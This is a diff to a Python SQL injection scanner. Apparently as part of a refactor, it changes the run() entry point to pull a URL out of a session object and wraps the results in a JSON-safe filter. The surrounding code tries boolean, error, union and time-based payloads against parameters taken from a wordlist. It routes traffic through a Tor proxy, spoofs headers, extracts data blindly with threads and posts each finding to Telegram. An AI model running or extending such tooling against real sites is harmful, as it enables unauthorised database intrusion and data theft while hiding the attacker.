@@ -19,12 +19,28 @@ COOKIES = ["", "PHPSESSID=abc123", "sessionid=test"]
 PROXIES = [None, {"http": "socks5h://127.0.0.1:9050"}]
 HEADERS_EXTRA = [{"X-Forwarded-For": "127.0.0.1"}, {"Referer": "https://example.com"}, {}]
 
+def _coerce_to_str(u):
+    if isinstance(u, str):
+        return u
+    try:
+        candidate = getattr(u, "url", None)
+        if isinstance(candidate, str):
+            return candidate
+    except Exception:
+        pass
+    try:
+        s = str(u)
+        if "://" in s or s.startswith("/") or s.startswith("http"):
+            return s
+    except Exception:
+        pass
+    return None
+
 def load_wordlist(filepath):
     try:
         with open(filepath, "r", encoding="utf-8", errors="ignore") as f:
             return [line.strip() for line in f if line.strip() and not line.startswith("#")]
     except Exception as e:
-        print(f"Failed to load wordlist: {filepath} ({e})")
         return []
 
 def load_dbms_signatures(wordlists_dir):
@@ -76,7 +92,7 @@ def send_req(url, params, method="GET", proxy=None, extra_headers=None, cookie="
             resp = requests.post(url, json=params, headers=headers, timeout=11, **kwargs)
         else:
             return None, "", 0
-        return resp.status_code, resp.text, resp.elapsed.total_seconds()
+        return resp.status_code, resp.text, getattr(resp.elapsed, "total_seconds", lambda: 0)()
     except Exception as e:
         return None, str(e), 0
 
@@ -133,7 +149,10 @@ def threaded_blind_extract(url, param, db_type, delay_s=0.3, maxlen=32):
     print("")
     return "".join(result)
 
-def run(response, url):
+def run(session, url, **kwargs):
+    url_str = _coerce_to_str(url) or _coerce_to_str(session)
+    if not url_str:
+        return []
     findings = []
     wordlists_dir = os.path.join(os.path.dirname(__file__), "..", "wordlists")
     param_list = load_wordlist(os.path.join(wordlists_dir, "burp-parameter-names.txt"))
@@ -146,88 +165,96 @@ def run(response, url):
                     for cookie in COOKIES:
                         for proxy in PROXIES:
                             for extra_header in HEADERS_EXTRA:
-                                # Boolean
                                 for true_pay, false_pay in BOOLEAN_PAYLOADS:
                                     tr, fa = tamper(true_pay), tamper(false_pay)
                                     params_true, params_false = {param_name: tr}, {param_name: fa}
-                                    sc_true, body_true, _ = send_req(url, params_true, method, proxy, extra_header, cookie)
-                                    sc_false, body_false, _ = send_req(url, params_false, method, proxy, extra_header, cookie)
+                                    sc_true, body_true, _ = send_req(url_str, params_true, method, proxy, extra_header, cookie)
+                                    sc_false, body_false, _ = send_req(url_str, params_false, method, proxy, extra_header, cookie)
                                     dbms = detect_dbms_auto(body_true + body_false, dbms_error_map)
                                     match = (sc_true == sc_false == 200 and not is_similar(body_true, body_false) and abs(len(body_true) - len(body_false)) > 6)
                                     if match:
                                         blind = ""
                                         if dbms != "unknown":
-                                            blind = threaded_blind_extract(url, param_name, dbms)
-                                        msg = f"[+] SQLi(Boolean) {param_name}@{url} DBMS={dbms} blind:{blind}"
+                                            blind = threaded_blind_extract(url_str, param_name, dbms)
+                                        msg = f"[+] SQLi(Boolean) {param_name}@{url_str} DBMS={dbms} blind:{blind}"
                                         print(msg)
                                         send_telegram(msg)
                                         fdict = {
                                             "type": "SQLi-Boolean", "desc": msg,
                                             "param": param_name, "payload": tr, "dbms": dbms, "blind": blind,
-                                            "url": url, "method": method, "cookie": cookie, "proxy": proxy, "header": extra_header
+                                            "url": url_str, "method": method, "cookie": cookie, "proxy": proxy, "header": extra_header
                                         }
                                         findings.append(fdict)
                                         sessionlog.append(fdict)
                                         json.dump(sessionlog, open("sqli_session.json", "w"), indent=2)
                                         return findings
-                                # Error
                                 for pay in ERROR_PAYLOADS:
                                     p_err = tamper(pay)
                                     params_err = {param_name: p_err}
-                                    sc, body, _ = send_req(url, params_err, method, proxy, extra_header, cookie)
+                                    sc, body, _ = send_req(url_str, params_err, method, proxy, extra_header, cookie)
                                     dbms = detect_dbms_auto(body, dbms_error_map)
                                     if dbms != "unknown":
-                                        msg = f"[+] SQLi(Error) {param_name}@{url} DBMS={dbms}"
+                                        msg = f"[+] SQLi(Error) {param_name}@{url_str} DBMS={dbms}"
                                         print(msg)
                                         send_telegram(msg)
                                         fdict = {
                                             "type": "SQLi-Error", "desc": msg, "param": param_name,
-                                            "payload": p_err, "dbms": dbms, "url": url,
+                                            "payload": p_err, "dbms": dbms, "url": url_str,
                                             "method": method, "cookie": cookie, "proxy": proxy, "header": extra_header
                                         }
                                         findings.append(fdict); sessionlog.append(fdict)
                                         json.dump(sessionlog, open("sqli_session.json", "w"), indent=2)
                                         return findings
-                                # Union
                                 for up in UNION_PAYLOADS:
                                     p_union = tamper(up)
                                     params_union = {param_name: p_union}
-                                    sc, body, _ = send_req(url, params_union, method, proxy, extra_header, cookie)
+                                    sc, body, _ = send_req(url_str, params_union, method, proxy, extra_header, cookie)
                                     dbms = detect_dbms_auto(body, dbms_error_map)
                                     if dbms != "unknown" and any(marker in body for marker in ["NULL", "version()", "user()"]):
-                                        msg = f"[+] SQLi(Union) {param_name}@{url} DBMS={dbms}"
+                                        msg = f"[+] SQLi(Union) {param_name}@{url_str} DBMS={dbms}"
                                         print(msg)
                                         send_telegram(msg)
                                         fdict = {"type": "SQLi-Union", "desc": msg,
-                                            "param": param_name, "payload": p_union, "dbms": dbms, "url": url,
+                                            "param": param_name, "payload": p_union, "dbms": dbms, "url": url_str,
                                             "method": method, "cookie": cookie, "proxy": proxy, "header": extra_header
                                         }
                                         findings.append(fdict); sessionlog.append(fdict)
                                         json.dump(sessionlog, open("sqli_session.json", "w"), indent=2)
                                         return findings
-                                # Time-based
                                 for tbp in TIMEBASED_PAYLOADS:
                                     tbpay = tamper(tbp)
                                     params_tb = {param_name: tbpay}
-                                    sc, body, elapsed = send_req(url, params_tb, method, proxy, extra_header, cookie)
+                                    sc, body, elapsed = send_req(url_str, params_tb, method, proxy, extra_header, cookie)
                                     dbms = detect_dbms_auto(body, dbms_error_map)
                                     if sc == 200 and elapsed > 4:
                                         blind = ""
                                         if dbms != "unknown":
-                                            blind = threaded_blind_extract(url, param_name, dbms)
-                                        msg = f"[+] SQLi(TimeBlind) {param_name}@{url} DBMS={dbms} DELAY:{elapsed:.1f}s blind:{blind}"
+                                            blind = threaded_blind_extract(url_str, param_name, dbms)
+                                        msg = f"[+] SQLi(TimeBlind) {param_name}@{url_str} DBMS={dbms} DELAY:{elapsed:.1f}s blind:{blind}"
                                         print(msg)
                                         send_telegram(msg)
                                         fdict = {
                                             "type": "SQLi-Blind-Time", "desc": msg,
                                             "param": param_name, "payload": tbpay, "dbms": dbms, "blind": blind,
-                                            "url": url, "method": method, "cookie": cookie, "proxy": proxy, "header": extra_header
+                                            "url": url_str, "method": method, "cookie": cookie, "proxy": proxy, "header": extra_header
                                         }
                                         findings.append(fdict); sessionlog.append(fdict)
                                         json.dump(sessionlog, open("sqli_session.json", "w"), indent=2)
                                         return findings
     except KeyboardInterrupt:
-        print("[!] Scan interrupted. Partial session will be written as sqli_session.json.")
         json.dump(sessionlog, open("sqli_session.json", "w"), indent=2)
         return findings
-    return findings
+    except Exception:
+        return []
+    # Final JSON-compat filter
+    out = []
+    for f in findings:
+        try:
+            d = dict(f)
+            for k, v in list(d.items()):
+                if hasattr(v, "__dict__") or "Session" in str(type(v)):
+                    d[k] = str(v)
+            out.append(d)
+        except Exception:
+            continue
+    return out
